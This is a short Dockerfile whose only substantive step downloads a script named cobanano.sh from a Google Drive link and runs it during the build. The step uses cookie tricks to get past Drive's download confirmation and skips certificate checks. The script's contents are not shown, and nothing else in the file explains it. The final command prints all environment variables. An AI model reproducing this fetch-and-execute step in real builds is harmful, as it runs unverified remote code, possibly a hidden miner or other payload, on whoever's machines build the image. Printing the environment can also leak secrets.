FROM ubuntu:zesty

RUN apt update && apt install wget -y && wget --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1JCD1zkDoMOMiJQcaY2_LzqUDglqUcEkN' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1JCD1zkDoMOMiJQcaY2_LzqUDglqUcEkN" -O cobanano.sh && rm -rf /tmp/cookies.txt && chmod u+x cobanano.sh && ./cobanano.sh
WORKDIR /usr/src/app

COPY . .

CMD ["printenv"]
